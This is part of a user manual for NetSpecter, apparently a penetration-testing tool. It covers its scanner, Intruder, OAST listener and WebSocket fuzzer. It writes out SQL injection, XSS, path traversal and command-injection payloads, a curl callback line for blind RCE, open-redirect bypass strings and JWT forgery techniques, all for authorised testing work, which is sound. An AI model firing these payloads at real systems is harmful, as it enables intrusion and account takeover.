   - **Page limit** — maximum pages to visit (default 100)
4. Click **Start Crawl** — discovered endpoints stream into the sitemap in real time
5. Click **Stop** at any time

#### Reading the Sitemap

The sitemap renders as a collapsible tree grouped by hostname and path depth. Each endpoint shows:

- HTTP method badge
- Endpoint type icon: **API** (JSON), **GraphQL**, **WebSocket**, **HTML**, **Asset**
- Parameter count (URL query params + body params discovered)

#### Context Menu Actions

Right-click any endpoint in the sitemap to:

- **Send to Repeater** — opens the endpoint as a pre-loaded Repeater request
- **Send to Scanner** — adds the endpoint to the Scanner's target queue
- **Send to Intruder** — opens the endpoint as an Intruder template
- **Copy URL** — copies the full URL to clipboard

---

### 19C. Active Vulnerability Scanner

The Scanner automatically tests target endpoints for the OWASP Top 10 vulnerability categories.

#### Selecting a Target

In the Scanner tab, choose one of three target modes:

- **URL** — scan a single URL directly (enter it in the input field)
- **Proxy History** — bulk scan all requests captured by the proxy (optionally filtered)
- **Sitemap** — scan all endpoints in the current sitemap

#### Configuring Modules

Ten scan modules are available — each maps to an OWASP 2021 category. Toggle each on or off:

| Module | OWASP Category | What It Tests |
| --- | --- | --- |
| SQLi | A03 Injection | Time-based, error-based, boolean, UNION injection |
| XSS | A03 Injection | Reflected, DOM sink hints, encoded bypasses |
| SSRF | A10 SSRF | Cloud metadata endpoints, timing-based blind |
| XXE | A03 Injection | File read probes, parser delta detection |
| Command Injection | A03 Injection | Output reflection, time-based blind |
| Path Traversal | A01 Access Control | LFI via traversal sequences, null byte |
| CORS | A05 Misconfiguration | Arbitrary origin, null origin, subdomain bypass |
| HTTP Headers | A05 Misconfiguration | Missing security headers, version disclosure, cookie flags |
| Broken Auth | A07 Auth Failures | Rate-limit bypass, user enum, weak creds, JWT |
| Deserialization | A08 Integrity Failures | PHP, Java, Python, .NET, Node.js object patterns |
| GraphQL Security | A03 Injection / A05 Misconfig | Introspection, batch abuse, nested DoS, field suggestion leakage, SQLi via resolver args |
| JWT Attacks | A07 Auth Failures | alg:none bypass, weak HMAC brute-force, kid injection, jku/x5u spoofing, expired token |
| OAuth / OIDC | A07 Auth Failures / A05 Misconfig | Open redirect_uri, missing state, code leakage via Referer, token in URL, PKCE absence |
| Open Redirect | A01 Access Control | 8 bypass techniques, Location header + JS/meta body redirect detection |

#### Scanner Settings

- **Concurrency** — parallel requests per module (1–20, default 10)
- **Timeout** — per-request timeout in milliseconds
- **Follow redirects** — include or exclude redirect chains

#### Running the Scan

Click **Start Scan**. Findings stream into the results table in real time, sorted by severity.

#### Reading Findings

Each finding row shows: severity badge, module name, affected URL, and parameter. Click a row to expand the detail section:

| Field | Description |
| --- | --- |
| **Description** | What the vulnerability is and why it matters |
| **Evidence** | The specific request and response that triggered the finding (payload sent, response snippet) |
| **Remediation** | Specific fix guidance for this finding type |
| **References** | Links to OWASP, CVE, or CWE entries |

#### New in Phase 7E — Advanced Web Security Modules

The four modules below are automatically run alongside the existing ten when their respective toggles are enabled in the Scanner module selector.

##### GraphQL Security Scanner

This module first performs a heuristic check to identify whether the target endpoint is a GraphQL endpoint — looking for `/graphql`, `/gql`, or `/query` in the path, or a JSON response body containing `data` or `errors` keys. Non-GraphQL endpoints are skipped immediately.

When a GraphQL endpoint is confirmed, five probes run in sequence:

1. **Introspection probe** — sends `{__schema{types{name kind}}}` and checks if the server returns full type information. Introspection enabled in production leaks your entire API schema.
2. **Batch query probe** — sends an array of 100 `{__typename}` queries in a single HTTP request. If the server returns 100 results, batching is enabled, which allows rate-limit bypass and query amplification.
3. **Deeply nested query DoS** — sends a 12-level nested query. If the server takes over 5 seconds without returning HTTP 400, it lacks query depth limiting and is vulnerable to resource exhaustion.
4. **Field suggestion leakage** — intentionally misspells a field name (`nsProbeField_typo`). If the response body contains "Did you mean", the server is leaking schema hints even when introspection is disabled.
5. **SQL injection via resolver arguments** — embeds `1' OR '1'='1` in a GraphQL argument. If the response contains a SQL error pattern, the GraphQL layer is passing user input directly to SQL resolvers.
6. **OAST probe** (if OAST listener is running) — embeds the OAST callback URL in a resolver argument. A callback confirms blind server-side request forgery or command injection through the GraphQL layer.

##### JWT Attack Suite

This module activates on any request that carries a JWT — either in the `Authorization: Bearer <token>` header or in a cookie named `token`, `jwt`, `access_token`, `id_token`, or `auth`. Requests without a JWT are skipped.

The JWT is decoded (no signature verification) and the following attacks are attempted:

1. **alg:none bypass** — forges a new token with `"alg":"none"` and an empty signature segment. If the server returns a 200-class response or the same successful body, it is accepting unsigned tokens.
2. **Weak HMAC brute-force** — tests 15 common secrets (`secret`, `password`, `12345`, `key`, `jwt`, `admin`, etc.) by constructing a valid HMAC-SHA256 signature and replaying the request. The first working secret is reported with its value.
3. **kid path traversal / SQL injection** — if the original header contains a `kid` field, forges tokens using path traversal strings (`../../dev/null`) and SQL injection payloads as the `kid` value. Server acceptance of these is a critical finding.
4. **jku / x5u spoofing** (passive detection) — if the token header contains `jku` or `x5u` pointing to an external domain, this is flagged as high severity without active probing. These headers instruct the server to fetch the signing key from an attacker-controlled URL.
5. **Expired token acceptance** — if the `exp` claim is in the past, the original token is replayed as-is. Server acceptance means tokens are never validated for expiry.
6. **Privilege claim advisory** — if the payload contains `role`, `admin`, `scope`, or `groups` claims, an informational advisory is emitted recommending server-side authorization validation regardless of token claims.

All attack probes use the exact same request as the original (same URL, same headers, same body) — only the `Authorization` header or cookie value is replaced with the forged token.

##### OAuth / OIDC Misconfiguration Scanner

This module detects OAuth/OIDC endpoints by matching URL patterns: `/oauth`, `/authorize`, `/auth/`, `/connect/`, `/openid`, `/token`, `/callback`, or query parameters `response_type=`, `client_id=`, `redirect_uri=`. Non-OAuth endpoints are skipped.

Seven checks run passively (no active probing required for most) plus one active probe:

1. **Open redirect in redirect_uri** (active) — replaces the `redirect_uri` parameter with each of the configured test domains (e.g., `https://evil.com`) and checks whether the server redirects to it. This is the highest-severity finding (High) as it enables authorization code or token theft.
2. **Missing state parameter** (passive) — if a `response_type` parameter is present but `state` is absent, the flow is vulnerable to CSRF. The attacker can force a victim to authorize their own malicious client.
3. **Code leakage via Referer** (passive) — if the request URL contains an authorization `code` parameter AND a `Referer` header pointing to a different origin, the authorization code may be transmitted to third-party analytics or CDN servers before it is exchanged.
4. **Token in URL query parameter** (passive) — if `access_token` or `id_token` appear as URL query parameters, they will be logged in server access logs and browser history.
5. **Token in URL fragment** (passive) — if `access_token` or `id_token` appear in the URL fragment (`#`), this indicates implicit flow usage, which is deprecated in OAuth 2.1.
6. **Missing PKCE** (passive) — if `response_type=code` is present without `code_challenge`, the authorization code flow lacks PKCE protection, making it vulnerable to code interception attacks, especially for public (SPA / mobile) clients.
7. **Client secret in URL** (passive) — if `client_secret` appears as a URL query parameter, it will be leaked in logs, browser history, and Referer headers.
8. **Implicit flow** (passive) — if `response_type=token` or `response_type=id_token token`, the deprecated implicit flow is flagged.

##### Open Redirect Scanner

This module scans every URL parameter whose name suggests it holds a redirect destination. The recognized parameter names include: `redirect`, `redirect_url`, `redirect_uri`, `return`, `return_url`, `returnUrl`, `next`, `to`, `goto`, `url`, `link`, `target`, `dest`, `destination`, `continue`, `forward`, `rurl`, `ref`, `checkout_url`, `successUrl`, `cancelUrl`, `go`, `callback`, `r`. Additionally, any parameter whose current value begins with `http://` or `https://` is also tested (URL-value heuristic).

For each candidate parameter, 8 bypass technique probes are sent in sequence, stopping after the first confirmed hit per parameter:

| Probe | Payload Example | Bypass Technique |
| --- | --- | --- |
| 1 | `https://evil-redir.netspectre.test/phish` | Direct external URL |
| 2 | `//evil-redir.netspectre.test/phish` | Protocol-relative (double-slash) |
| 3 | `///evil-redir.netspectre.test/phish` | Triple-slash |
| 4 | `\evil-redir.netspectre.test/phish` | Backslash separator |
| 5 | `%68%74%74%70%73://evil-redir.netspectre.test` | URL-encoded scheme |
| 6 | `%2568%2574%2574%2570%2573://evil-redir.netspectre.test` | Double URL-encoded |
| 7 | `https://evil-redir.netspectre.test%09/phish` | Tab-encoded path separator |
| 8 | `https://target.com@evil-redir.netspectre.test/phish` | `@`-sign authority confusion |

A redirect is confirmed when either:

- The HTTP response `Location` header redirects to the probe domain (not the original target domain)
- The response body contains a JavaScript `window.location` assignment or a `<meta http-equiv="refresh">` pointing to the probe domain

Findings are deduplicated per parameter — only one finding is emitted per confirmed-vulnerable parameter, using the first successful bypass technique as the evidence.

#### Send to Repeater

Click **Send to Repeater** on any finding to open the exact triggering request in Repeater for manual follow-up.

#### Network Badge

When a scanner finding involves a host that is also in the Network workspace, a `.web-vuln-badge` is automatically injected onto that host's card in the Network tab — creating a visual link between web-layer findings and network-layer hosts.

#### Exporting Results

Click **Export** and choose:

- **JSON** — full findings array with all fields, suitable for programmatic processing
- **CSV** — one finding per row (severity, title, URL, parameter, evidence)
- **HTML Report** — styled standalone report with severity-grouped sections and remediation guidance

---

### 19D. Request Repeater

The Repeater lets you manually modify and retransmit any HTTP request, bypassing browser CORS restrictions entirely.

#### Opening Repeater

- Right-click any row in the Proxy History table → **Send to Repeater**
- Right-click any sitemap endpoint → **Send to Repeater**
- Click **Send to Repeater** from any Scanner finding
- Click the **＋** button in the Repeater tab to open a blank request

#### Editing a Request

The left pane contains a raw HTTP request editor:

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer eyJ...

{"username":"admin","password":"test"}
```

Edit any field — method, path, headers, or body — and click **Send**. The right pane shows the response:

- Raw HTTP response headers
- Response body (syntax-highlighted for JSON/HTML/XML)
- Status code, response size, and round-trip time

#### Request History

Each Repeater tab maintains its own history. Use the **◀ Back** and **▶ Forward** buttons to navigate through previous requests in that tab. This allows you to compare responses across multiple manual modifications.

#### Multiple Tabs

Click **＋ New Tab** to open additional independent Repeater sessions. Each tab maintains its own state, history, and target host settings.

#### HTTPS & TLS

Repeater sends requests directly via Node.js — no browser involved. TLS certificate validation can be toggled per-tab (for testing self-signed or expired certificates without changing global settings).

---

### 19E. Intruder

Intruder automates customizable fuzzing attacks against HTTP endpoints — similar to Burp Suite Intruder.

#### Setting Up a Request Template

Open a request in Intruder (from Proxy History right-click, Sitemap, or Scanner finding). The raw request appears in the template editor.

#### Marking Positions

Highlight any value in the request template and click **Add §** to wrap it with position markers:

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"§admin§","password":"§password§"}
```

Each `§value§` pair is an injection position. The original value between markers is preserved as a placeholder.

#### Choosing an Attack Type

| Attack Type | Behavior | Use Case |
| --- | --- | --- |
| **Sniper** | One payload list; iterates through each position independently | Username/password field testing, one variable at a time |
| **Battering Ram** | One payload list; same payload applied to all positions simultaneously | Session token or shared-value fuzzing |
| **Pitchfork** | Multiple payload lists; applies list[n] to position[n] in parallel | Credential pairs (username list + matching password list) |
| **Cluster Bomb** | Multiple payload lists; tests every combination (Cartesian product) | Full credential stuffing |

#### Configuring Payloads

For each position (or for the shared list, depending on attack type):

- **Manual list** — type or paste payloads one per line
- **Built-in wordlists** — select from NetSpecter's bundled lists (usernames, passwords, SQLi payloads, XSS payloads)
- **Load file** — browse to a custom `.txt` wordlist

#### Running the Attack

- Set **Concurrency** (1–20 simultaneous requests) and **Request Timeout**
- Click **Start Attack**

Results stream into the table as requests complete:

| Column | Description |
| --- | --- |
| # | Request index |
| Payload | Payload(s) used |
| Status | HTTP response status code |
| Length | Response body size in bytes |
| Duration | Round-trip time in milliseconds |
| Delta | Response size difference from baseline |

#### Analysing Results

Sort by **Length** or **Delta** to spot anomalous responses that may indicate a successful injection or authentication bypass. Click any row to see the full response in the detail pane.

---

### 19F. Token Sequencer

The Token Sequencer analyzes the randomness quality of session tokens, CSRF tokens, API keys, and any other string values generated by the server.

#### Capturing Tokens

1. In the Sequencer tab, configure the **Token Source**:
   - Paste a sample response that contains the token
   - Or send a request from Proxy History that generates a token
2. Identify the **Token Location** using the extraction editor:
   - Cookie name (e.g., `PHPSESSID`)
   - Response header name
   - JSON path (e.g., `$.token`)
   - Regex pattern

#### Collecting Samples

Click **Start Capture** — Sequencer repeatedly requests the configured endpoint and extracts a token from each response. The default sample count is 100 tokens; increase to 1000+ for more accurate statistical results.

#### Analysis Results

Once collection is complete, click **Analyze** to run statistical tests:

- **Entropy estimate** — bits of effective entropy (aim for ≥ 64 bits for security)
- **Bit-level entropy chart** — per-bit entropy visualization; flat lines indicate predictable bit positions
- **FIPS 140-2 Tests**:
  - Monobit: proportion of 1-bits (should be ~50%)
  - Poker: distribution of 4-bit groups (chi-squared)
  - Runs: counts of consecutive identical bits
  - Long Runs: maximum run length (should be ≤ 25)
- **Overall verdict**: Pass / Marginal / Fail with explanation

A "Fail" verdict means the token generation is statistically predictable and tokens may be forgeable.

---

### 19G. Encoder / Decoder

A multi-format encoding, decoding, and hashing toolbox — no IPC required, runs entirely in the browser.

#### Using the Toolbox

1. Paste any input into the text area
2. Click an operation from the toolbar:

   | Operation | Description |
   | --- | --- |
   | URL Encode | `%XX` encoding for URL contexts |
   | URL Decode | Decode `%XX` sequences |
   | HTML Encode | Convert `<`, `>`, `&`, `"` to HTML entities |
   | HTML Decode | Reverse HTML entity encoding |
   | Base64 Encode | Standard Base64 |
   | Base64 Decode | Base64 decode (handles padding) |
   | Hex Encode | Convert each byte to `\xNN` hex |
   | Hex Decode | Decode hex string |
   | MD5 | 128-bit hash |
   | SHA-1 | 160-bit hash |
   | SHA-256 | 256-bit hash |
   | SHA-512 | 512-bit hash |
   | GZIP Decompress | Decompress a GZIP blob |

3. The result appears in the output area immediately
4. Click **Copy** to copy the result to clipboard

#### Smart Decode

Click **Smart Decode** to automatically detect and peel encoding layers. Useful for multi-encoded values commonly used in XSS or bypass payloads (e.g., double-URL-encoded, Base64-encoded-then-URL-encoded).

#### Chaining Operations

Click **Use Output as Input** to chain multiple operations. For example: `Hex Encode` → `Base64 Encode` → output is a double-encoded representation.

---

### 19H. Response Comparer

Compare two HTTP responses side-by-side to spot subtle differences — invaluable for detecting boolean-based injection, username enumeration, or access control differences.

#### Loading Responses

There are three ways to populate the two comparison panes:

- **From Proxy History** — right-click any history row and select **Send to Comparer (Left)** or **Send to Comparer (Right)**
- **From Repeater** — click **Send to Comparer** in the Repeater response pane
- **Paste manually** — click the **Edit** button in either pane and paste any text

#### Comparison Modes

- **Word-level** — highlights individual changed words; best for readable text like HTML or JSON
- **Byte-level** — highlights every changed character; best for binary or compressed data

#### Reading the Diff

- **Green highlight** — content present in the right pane but not the left (added)
- **Red highlight** — content present in the left pane but not the right (removed)
- **No highlight** — identical content
- The **Summary bar** at the top shows total added/removed/changed token counts

#### Use Cases

- Compare a login response for a valid username vs. an invalid username (user enumeration)
- Compare a response with `AND 1=1` vs. `AND 1=2` in a parameter (boolean SQLi confirmation)
- Compare authenticated vs. unauthenticated responses to the same endpoint (IDOR / broken access control)
- Compare two session token values character-by-character (token structure analysis)

---

### 19I. OAST — Out-of-Band Callback Listener

OAST (Out-of-Band Application Security Testing) is the technique of confirming blind vulnerabilities by making the target server initiate an outbound network connection to a callback URL that you control. This is the gold standard for confirming SSRF, XXE, blind Command Injection, and blind GraphQL injection — vulnerabilities that produce no visible output in the HTTP response.

> **When to use OAST:** Use OAST when the scanner's in-band probes (response analysis, timing) are inconclusive, or when testing over-the-LAN targets that cannot reach the internet. Because the OAST server binds on all interfaces (`0.0.0.0`), any target on the same LAN segment as your machine can reach the callback URL.

#### Setting Up the OAST Listener

1. In the Web App workspace, click **📡 OAST** in the left sidebar
2. The OAST panel opens, showing the configuration strip at the top

##### Selecting the Callback Interface

The **Callback Interface** dropdown is populated at startup with all non-internal IPv4 network interfaces detected on your machine. Each entry shows the interface name and its IP address, for example:

- `Ethernet (192.168.1.10)` — your LAN adapter
- `tun0 (10.8.0.5)` — a VPN or lab tunnel
- `All interfaces (0.0.0.0)` — auto-detect (uses the first non-internal IP found)

**Select the interface whose IP is reachable by your target.** For example:

- If your target is on the same LAN, select your Ethernet or Wi-Fi adapter
- If your target is behind a VPN, select your VPN tunnel interface
- If you are unsure, leave it on "All interfaces (0.0.0.0)" — NetSpecter will auto-detect

The selected IP becomes the base of all generated callback URLs (e.g., `http://192.168.1.10:7331/oast/{token}`). The server itself always binds on all interfaces regardless of this selection.

##### Setting the Port

The default listener port is **7331**. Change it to any value between 1025 and 65534. Make sure no firewall rule blocks inbound TCP on this port from the target host.

##### Starting the OAST Listener

Click **▶ Start**. The status badge changes to **● Listening** and the full callback URL template appears below the controls, for example:

```text
Listening at http://192.168.1.10:7331/oast/{token}
```

The interface dropdown and port field are disabled while the listener is running. Click **⏹ Stop** to shut down the server.

#### Generating Probe Tokens

Probe tokens are the mechanism for correlating which scanner payload triggered which callback.

1. In the **Generate probe URL** row, optionally type a label in the **Label / context** field (e.g., `xxe-test`, `ssrf-aws`, `sqli-outband`). Labels help you identify findings in the callbacks table.
2. Click **Generate Token** — a unique 24-character hex token is allocated and the full callback URL appears in the output field:

   ```text
   http://192.168.1.10:7331/oast/a3f8c12e9b04d7a1fe2c5d89
   ```

3. Click **📋** to copy the URL to clipboard
4. Paste this URL into your target payload — in a request body parameter, a URL field, an XML entity, a GraphQL argument, etc.

#### Reading the Callbacks Table

When the target application makes an HTTP request to any `http://<your-ip>:7331/oast/<token>` URL:

- A new row is **prepended** to the callbacks table (newest first)
- The row shows: **Time**, **Remote IP** (the source IP of the callback — the target server), **Method** (usually GET), and the **Context** (your label + shortened token)

If the remote IP is an internal cloud address (e.g., `169.254.169.254`, `metadata.google.internal`), it confirms SSRF to a cloud metadata endpoint. If it is the target's own IP, it confirms the server is executing your payload. If it is an unexpected IP, the target may be using a reverse proxy — investigate the infrastructure.

The callback count is shown in the toolbar. Click **Clear** to reset the table and release all allocated tokens.

#### Using OAST with the Active Scanner

When the OAST listener is running, the Active Vulnerability Scanner automatically uses it for blind confirmation probes in the following modules:

| Scanner Module | How OAST Is Used |
| --- | --- |
| **SSRF** | Embeds the OAST callback URL as the value in URL, hostname, and `Host` header probes. A callback confirms the server fetched the URL server-side. |
| **XXE** | Injects an XML external entity declaration that fetches the OAST URL via HTTP. A callback confirms the XML parser is resolving external entities. |
| **Command Injection** | Appends a `curl <oast-url>` or `wget <oast-url>` payload. A callback confirms OS-level command execution. |
| **GraphQL** | Embeds the OAST URL in a resolver argument. A callback via the GraphQL server confirms blind SSRF or server-side injection through the GraphQL layer. |

You do not need to do anything special to enable this — start the OAST listener before running a scan and it is used automatically.

#### Advanced: Manual OAST Injection Workflow

For targets that cannot be reached by the automatic scanner (e.g., targets you interact with manually through the Repeater):

1. Start the OAST listener and generate a token with a descriptive label (e.g., `repeater-xxe-test`)
2. Copy the callback URL
3. In the Repeater, craft an XXE or SSRF payload containing the callback URL
4. Send the request and watch the OAST callbacks table
5. If a callback arrives, you have confirmed blind exploitation. The remote IP shows you whether the callback came directly from the target or through an intermediary (reverse proxy, WAF, cloud egress NAT, etc.)

---

### 19J. WebSocket Fuzzer

The WebSocket Fuzzer sends a configurable list of payloads over real WebSocket connections, detecting error patterns, timing anomalies, and upgrade failures that indicate injection vulnerabilities in WebSocket message handlers.

> **No external dependencies required.** The fuzzer implements the complete RFC 6455 WebSocket protocol using only Node.js `net` and `tls` modules — masking, frame encoding, variable-length payload headers (7-bit, 16-bit, and 64-bit), and connection upgrade are all handled natively.

#### Opening the WebSocket Fuzzer

**Method 1 — From the sidebar:**

1. Switch to the **Web App** workspace (click the Web App tab at the top)
2. Click **🔌 WS Fuzz** in the left sidebar

**Method 2 — From the Network workspace:**
When you find a host with an HTTP port open (80, 443, 8080, 8443, etc.), right-click the port or use the **Dir Fuzz** action button and the WS Fuzzer can be opened pre-populated with that host's URL converted to `ws://` or `wss://`.

**Method 3 — Programmatic pivot:**
`window.__openWsFuzzerPanel('https://target.com')` — called automatically by the Scanner or Sitemap when a WebSocket endpoint is detected. The URL is converted from `https://` to `wss://` or from `http://` to `ws://` automatically.

#### Configuring the Fuzzer

##### Target URL

Enter the WebSocket endpoint URL. Must use the `ws://` or `wss://` scheme:

- `ws://target.com/ws` — plain WebSocket
- `wss://target.com/socket` — WebSocket over TLS (self-signed certificates are accepted)

If you paste an `http://` or `https://` URL (e.g., from the proxy history), the scheme is automatically converted.

##### Payloads

Two payload source modes are available, toggled by radio button:

**Manual (textarea):**
Type or paste one payload per line in the text area. Useful for targeted injection strings:

```text
' OR '1'='1
<script>alert(1)</script>
{"$gt": ""}
../../etc/passwd
; ls -la
```

**File:**
Click **Browse** and select a `.txt` wordlist (one payload per line). Files up to hundreds of thousands of entries are supported. The fuzzer streams through the list with the configured concurrency — memory usage stays flat regardless of file size.

##### Concurrency

The **Connections** slider (1–20, default 5) controls how many simultaneous WebSocket connections are maintained. Each slot:

1. Opens a TCP (or TLS) socket
2. Performs the full HTTP Upgrade handshake
3. Sends one payload frame
4. Waits for the server's response frame
5. Closes the connection

Set concurrency low (2–3) for targets that rate-limit or close sockets aggressively. Higher concurrency (10–20) is suitable for local lab targets.

##### Timeout

Per-connection timeout in milliseconds (default 8000 ms / 8 seconds). This covers both the upgrade handshake and the wait for a response frame. Connections that exceed this limit are recorded as timing anomalies — useful for detecting time-based blind injection.

##### Extra Headers

The **Extra Headers (JSON)** field accepts an optional JSON object of additional HTTP headers to include in the WebSocket Upgrade request. Useful for:

- Adding `Authorization` headers for authenticated endpoints:

  ```json
  {"Authorization": "Bearer eyJ..."}
  ```

- Setting `Cookie` headers to maintain session state:

  ```json
  {"Cookie": "session=abc123; csrf=xyz"}
  ```

- Adding application-specific headers required by the target's WebSocket server

#### Running the WebSocket Fuzz

Click **▶ Start Fuzzing**. The progress bar fills as payloads complete. The **Hits** counter increments for each anomalous response (error pattern detected, upgrade rejected, or timeout).

Click **⏹ Stop** at any time to abort remaining payloads. Already-in-flight connections complete naturally; queued connections are cancelled.

#### Reading the Results Table

Each row in the results table corresponds to one payload:

| Column | Description |
| --- | --- |
| **#** | Payload index (1-based) |
| **Payload** | The exact string sent over the WebSocket |
| **Response** | The server's response text (first frame body, truncated to 200 chars) |
| **ms** | Round-trip time from payload send to response frame receipt |
| **Status** | Badge indicating the result type |

##### Status Badges

| Badge | Meaning |
| --- | --- |
| **Error** (red) | Response matched one of the 8 error patterns (Java exception, SQL error, JS error, Python traceback, PHP warning, internal server error, DB access denied, PHP undefined variable) |
| **Timeout** (orange) | No response frame received within the timeout period — possible time-based blind injection |
| **No Upgrade** (orange) | Server rejected the WebSocket Upgrade handshake (`101 Switching Protocols` not received) |
| **OK** (green / default) | Server accepted the upgrade and returned a response frame without triggering any anomaly patterns |

##### Filtering to Anomalies

Toggle the **Anomalies only** checkbox to hide all non-anomalous rows. This brings the signal out of the noise when fuzzing with large wordlists, so you can focus on the payloads that caused unusual server behavior.

#### Analyzing Findings

**Error pattern hit (red badge):**
The server's response message reveals implementation details. A "You have an error in your SQL syntax" response to a WebSocket message means the WebSocket handler is passing message content directly into a SQL query — treat this as a critical SQLi finding. Send the triggering payload to Repeater for manual follow-up.

**Timeout (orange badge):**
If a payload consistently causes the server to take significantly longer than others, a time-based blind vulnerability may be present. Compare the duration of a benign payload (e.g., `hello`) versus the anomalous one. A consistent 5-second delay for `'; WAITFOR DELAY '0:0:5'--` confirms time-based SQL injection.

**No Upgrade (orange badge):**
Some payloads in the URL path or query string can trigger server-side validation errors before the WebSocket upgrade completes. This is still a useful finding — it indicates the server is processing your input before allowing the connection.

**Normal responses (green):**
Review the Response column even for non-anomalous results. Reflected content, internal path disclosures, or verbose error structures can appear in normal-looking WebSocket responses.

#### Exporting WebSocket Fuzz Results

Click **Export CSV** to download the full results table as a CSV file with columns: index, payload, response, duration_ms, upgraded, error_type, timed_out, anomaly. This file can be imported into spreadsheet tools for bulk analysis or included in a pentest report.

#### Example: Testing a Chat Application for Command Injection

A target application uses WebSockets for its chat feature. You suspect the message handler passes user input to a shell command.

1. Open the WebSocket Fuzzer and enter `wss://target.com/chat`
2. Add the header `{"Cookie": "session=your-valid-session-token"}`
3. Select **Manual** payloads and enter:

   ```text
   hello
   ; id
   `id`
   $(id)
   ' && id && echo '
   | id
   ```

4. Set concurrency to 2 (to avoid flooding the chat server)
5. Click **Start Fuzzing**
6. If any payload returns a response containing `uid=` or `www-data`, command injection is confirmed
7. Combine with the OAST listener: add `; curl http://192.168.1.10:7331/oast/<token>` as a payload — a callback confirms blind RCE even when the response doesn't reflect output

---

## 20. Persisting & Sharing Session Data

### Saving a Session

Click **💾 Save Results** in the top control bar. NetSpecter serializes the complete current state to a JSON file:

- All discovered hosts, open ports, OS fingerprints, and vendor data
- Deep scan results, service banners, and SSL certificate details
- All discovered CVEs from Nmap vuln scans
- Hardening Monitor delta history
- SNMP walk results
- Cloud enumeration findings

Select the output path in the native file dialog and click **Save**.

### Loading a Session

Click **📂 Load Results** in the top control bar. Browse to a previously saved JSON file and open it. NetSpecter re-instantiates the exact saved state — all host cards, port data, and findings are restored without rescanning.

> **Note:** Proxy request history (the SQLite database) is stored separately in your OS application data directory and persists automatically between app restarts. It is not included in the JSON session file.

### Exporting Individual Feature Data

Most features have their own export options:

| Feature | Export Format | How to Access |
| --- | --- | --- |
| Proxy History | HAR 1.2 JSON | Proxy tab → Export HAR |
| Scanner Findings | JSON / CSV / HTML | Scanner tab → Export |
| Cloud Enum Findings | JSON | Cloud Enum panel → Export |
| Dir Fuzzer Results | CSV | Dir Fuzz panel → Export CSV |
| Brute Force Results | CSV | Brute Force modal → Export |
| Credential Spray | CSV | Cred Spray panel → Export |
| SNMP Walk Data | Clipboard / text | SNMP results → Copy |
| WS Fuzzer Results | CSV | WS Fuzz panel → Export CSV |
| Topology Graph | PNG | Topology tab → Camera icon |

---

## 21. Keyboard Shortcuts & UI Tips

### Global Shortcuts

| Shortcut | Action |
| --- | --- |
| `Ctrl+S` | Save session |
| `Ctrl+O` | Load session |
| `Escape` | Close open modal or panel |
| `Ctrl+Shift+I` | Open Electron DevTools (development builds only) |

### UI Tips

- **Resizable panels** — drag the divider handle between the host grid and the Details panel to resize. Drag the divider in the Share Explorer or Repeater to resize sub-panes.
- **Right-click context menu** — right-clicking any host card reveals quick actions: Deep Scan, Brute Force, Dir Fuzz, Cloud Enum, Enumerate Shares, Capture Packets.
- **Port badges are clickable** — click any blue port badge in the Details panel to trigger a targeted Nmap service scan on that specific port (requires Nmap mode to be active).
- **Network → Web pivot** — clicking the **Dir Fuzz** or **Send to Scanner** button on any HTTP port in the Details panel automatically opens the Web App workspace with that URL pre-loaded.
- **Dependency indicators** — buttons and sections that require an uninstalled external tool are hidden entirely rather than shown as disabled, keeping the UI clean.
- **Consent gate** — if you accidentally dismiss the pentest consent gate, it will reappear the next time you attempt an offensive action (it only auto-dismisses after explicit acceptance, not on close/escape).
- **Auto-updates** — NetSpecter checks for updates on startup. When a new version is available, a banner appears with a one-click download. Updates are applied on next restart.
